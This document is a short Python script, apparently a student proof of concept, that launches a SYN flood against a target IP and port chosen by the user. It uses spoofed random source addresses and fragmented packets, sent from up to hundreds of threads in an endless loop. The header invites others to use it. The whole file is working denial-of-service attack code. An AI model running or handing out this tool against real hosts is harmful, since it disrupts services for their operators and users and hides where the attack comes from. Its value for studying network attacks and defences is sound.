#!/usr/bin/python
##
# inventedAttack.py - A POC attack combining IP SPoofing, SYN Flood and IP Fragmentation
# I only made this to feed my own curiosity (and for a classroom homework too tbh) 
# since it's not very effective nowadays, but feel free to use it!
#
#
# David Carracedo Martinez - dcarracedom@uoc.edu 2019
##

import random
import sys
import threading
import click
from scapy.all import *
from faker import Faker


targetIp = None
targetPort = None
threadLimit = 200
fragSize = 500
payload="A"*2000
fake = Faker()


class sendSYN(threading.Thread):
	global targetIp, targetPort, payload
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		#Layer 3 forging
		ip = IP()
		ip.src = fake.ipv4_public(network=False, address_class=None)
		ip.dst = targetIp

		#Layer 4 forging
		tcp = TCP()
		tcp.sport = random.randint(1025,65535)
		tcp.dport = targetPort
		#Here comes the SYN flood mechanic part, yes, that easy
		#Only make sure you don't respond with another script!
		tcp.flags = 'S'
		
		#Reuse the socket a couple of times
		for x in range(10):
			#The actual packet
			packet=ip/tcp/payload
			#And finally the fagmentation and sending the fragments part
			frags=fragment(packet,fragsize=fragSize)
			for fragments in frags:
				send(fragments,verbose=0)


if __name__ == "__main__":

	@click.command()
	@click.option('--ip', '-i', prompt=True, help='IP address of the target machine')
	@click.option('--port', '-p', type=(int),prompt=True, help='Port of the service to attack with SYN Flood')
	@click.option('--threads', '-t', type=(int), prompt=True,help='Number of concurrent threads')
	@click.option('--size', '-s', type=(int), prompt=True,help='Fragment size')
	def start(ip,port,threads,size):
		global targetIp,targetPort, threadLimit, fragSize
		targetIp = ip
		targetPort = port
		threadLimit = threads
		fragSize = size
		total = 0
		print ("Flooding %s:%s with SYN fragmented packets" % (ip,port))
		while True:
			if threading.activeCount() < threadLimit:
				sendSYN().start()
				total+=10
				sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)

	start()
